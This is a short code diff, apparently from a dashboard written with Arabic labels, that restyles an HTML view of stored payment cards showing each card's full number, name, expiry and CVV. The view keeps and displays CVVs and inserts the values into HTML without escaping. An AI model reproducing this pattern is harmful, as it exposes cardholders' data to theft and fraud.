@@ -1196,11 +1196,11 @@
             html += '</div>';
             html += '</div>';
             html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-            html += '<div class="grid grid-cols-2 gap-3 text-sm">';
-            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
-            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
-            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
+            html += '<div class="grid grid-cols-2 gap-4 text-base">';
+            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '') + '</span></div>';
+            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium text-lg">' + card.nameOnCard + '</span></div>';
+            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + card.cvv + '</span></div>';
             html += '</div>';
             // Action buttons for each card
             html += '<div class="flex gap-2 mt-3">';
